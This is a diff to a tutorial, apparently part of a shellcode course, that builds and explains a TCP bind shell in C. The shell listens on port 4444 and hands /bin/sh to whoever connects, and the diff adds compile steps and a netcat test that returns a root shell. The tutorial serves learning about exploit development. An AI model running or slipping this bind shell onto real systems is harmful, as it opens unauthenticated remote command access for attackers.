@@ -36,7 +36,11 @@ int ipv4Socket = socket(AF_INET, SOCK_STREAM, 0);
 ```
 2. Create a TCP-IP Address for the Socket.  
 ```c
-struct sockaddr_in ipSocketAddr = { .sin_family = AF_INET, .sin_port = htons(4444), .sin_addr.s_addr = htonl(INADDR_ANY) };
+struct sockaddr_in ipSocketAddr = { 
+  .sin_family = AF_INET,
+  .sin_port = htons(4444),
+  .sin_addr.s_addr = htonl(INADDR_ANY)
+};
 ```
 3. Bind the TCP-IP Address to the Socket.  
 ```c
@@ -65,6 +69,8 @@ execve("/bin/sh", NULL, NULL);
 This is our C program to create a TCP Bind Shell.  
 
 ```c
+// Filename: basicBindShell.c
+// Author:   boku
 #include <sys/types.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
@@ -74,22 +80,42 @@ This is our C program to create a TCP Bind Shell.
 int main(void)
 {
   int ipv4Socket = socket(AF_INET, SOCK_STREAM, 0);
-  struct sockaddr_in ipSocketAddr = { 
-    .sin_family = AF_INET;
-    .sin_port = htons(4444);
-    .sin_addr.s_addr = htonl(INADDR_ANY) 
+  struct sockaddr_in ipSocketAddr = {
+    .sin_family = AF_INET,
+    .sin_port = htons(4444),
+    .sin_addr.s_addr = htonl(INADDR_ANY)
   };
-  bind(ipv4Socket, (struct sockaddr*) &ipSocketAddr, sizeof(ipSocketAddr)); 
+  bind(ipv4Socket, (struct sockaddr*) &ipSocketAddr, sizeof(ipSocketAddr));
   listen(ipv4Socket, 0);
   int clientSocket = accept(ipv4Socket, NULL, NULL);
   dup2(clientSocket, 0);
   dup2(clientSocket, 1);
   dup2(clientSocket, 2);
   execve("/bin/sh", NULL, NULL);
-}	
-```  
+}
+```
 
-Great, now lets dive into the manual pages to find out how all these functions work.
+Great, before we dive into how this was created, lets test it to make sure it works.
+
+### Compiling C Bind Shell
+```console
+root# gcc basicBindShell.c -o basicBindShell
+```
+
+### Testing the Shellcode within by Executing the Host Program
+#### Terminal Window 1
+```console
+root# ./basicBindShell
+```
+#### Terminal Window 2
+```console
+root# netstat -tanlp | grep basicBind
+tcp   0   0 0.0.0.0:4444    0.0.0.0:*   LISTEN    31804/basicBindShell
+root# nc.traditional 127.0.0.1 4444
+id
+uid=0(root) gid=0(root) groups=0(root)
+```
+Awesome! It works. Lets dive into these C functions and how they work.
 
 ### 1. Create a new Socket
 Our first function is `socket()`. We already know that this function is used to create a new socket.   
@@ -118,7 +144,8 @@ Now that our IPv4, TCP socket has been created, we will need to create an addres
 To create the TCP-IP address (TCP Port Number & IP Address), we will dig into the `ip` man pages with command `man 7 ip`.   
 We find this relevant information:
 ```c
-An IP socket address is defined as a combination of an IP interface address and a 16-bit port number.
+// An IP socket address is defined as a combination of an IP 
+//  interface address and a 16-bit port number.
 struct sockaddr_in {
   sa_family_t    sin_family; // address family: AF_INET
   in_port_t      sin_port;   // port in network byte order. See "man htons".
@@ -135,7 +162,11 @@ From the above information, we know that we will need to use the Address Family 
 
 The struct we will use is:  
 ```c
-struct sockaddr_in ipSocketAddr = { .sin_family = AF_INET, .sin_port = htons(4444), .sin_addr.s_addr = htonl(INADDR_ANY) };
+struct sockaddr_in ipSocketAddr = { 
+  .sin_family = AF_INET, 
+  .sin_port = htons(4444), 
+  .sin_addr.s_addr = htonl(INADDR_ANY)
+};
 ```
 + `man htons` - The `htons()` function converts an unsigned short integer hostshort from host byte order to network byte order.
 + `man htonl` - The `htonl()` function converts the unsigned integer hostlong from host byte order to network byte order.
@@ -146,12 +177,17 @@ we will use the `bind()` C function to accomplish this, and dive into the man pa
 ```c
 int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);  
 ```
-+ `sockfd`                - The socket file descriptor is the variable `ipv4Socket` we created earlier when creating the socket.  
-+ `struct sockaddr *addr` - A pointer to the TCP-IP Socket Address we created earlier with the variable `ipSocketAddr`.  
-+ `socklen_t addrlen`     - The final arguement is simply the byte length of our `ipSocketAddr` struct. We will fufill this using the C `sizeof()` function to do the work for us.  
++ `sockfd`
+  - The socket file descriptor is the variable `ipv4Socket` we created earlier when creating the socket.  
++ `struct sockaddr *addr`
+  - A pointer to the TCP-IP Socket Address we created earlier with the variable `ipSocketAddr`.  
++ `socklen_t addrlen`
+  - The final arguement is simply the byte length of our `ipSocketAddr` struct. 
+  - We will fufill this using the C `sizeof()` function to do the work for us. 
+
 Our bind function will be:   
 ```c
-bind(ipv4Socket, (struct sockaddr\*) &ipSocketAddr, sizeof(ipSocketAddr));
+bind(ipv4Socket, (struct sockaddr*) &ipSocketAddr, sizeof(ipSocketAddr));
 ```
 
 ### 4. Listen for incoming connections on the TCP-IP Socket
@@ -161,8 +197,10 @@ We find that the `listen()` function requires two arguments.
 ```c
 int listen(int sockfd, int backlog);
 ```
-+ `sockfd`  - Simply our `ipv4Socket` variable. 
-+ `backlog` - This is for handling multiple connections. 
++ `sockfd`
+  - Simply our `ipv4Socket` variable. 
++ `backlog`
+  - This is for handling multiple connections. 
   - We only need to handle one connection at a time, therefor we will set this value to `0`. 
 
 Our C function will be:   
@@ -173,8 +211,11 @@ listen(ipv4Socket, 0);
 ### 5. Accept the incoming connections and create a new connected session
 Now that our socket is listening we need to accept the incoming connections with the C function `accept()`.  
 Consulting the manual page with `man 2 accept` we find that:  
-+ the accept function takes the connection request from the listen function and creates a new connected socket.
-+ `int accept(int sockfd, struct sockaddr \*addr, socklen_t \*addrlen);`
+```c
+// the accept function takes the connection request from the listen function and creates a new connected socket.
+int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
+```
+
 We will give our `accept()` function the variable name `clientSocket`. We will use our `ipv4Socket` variable we created earlier to fulfill the `int sockfd` arguments, and set the remaining two arguments to `NULL`.   
 
 Our C function will be:   
@@ -325,8 +366,11 @@ This System Call is tricky because we will need to have an array within an array
  This is the struct we used in C to store the IP-Socket Address values used for the bind() function call:  
 
 ```c
-struct sockaddr_in ipSocketAddr = { .sin_family = AF_INET, .sin_port = htons(4444), .sin_addr.s_addr = INADDR_ANY };
-                                              ARG[0]               ARG[1]                          ARG[2]
+struct sockaddr_in ipSocketAddr = { 
+  .sin_family = AF_INET,         // ARG[0]
+  .sin_port = htons(4444),       // ARG[1]
+  .sin_addr.s_addr = INADDR_ANY  // ARG[2]
+};
 ```  
 
 + `ARG[0] = AF_INET = 0x2`
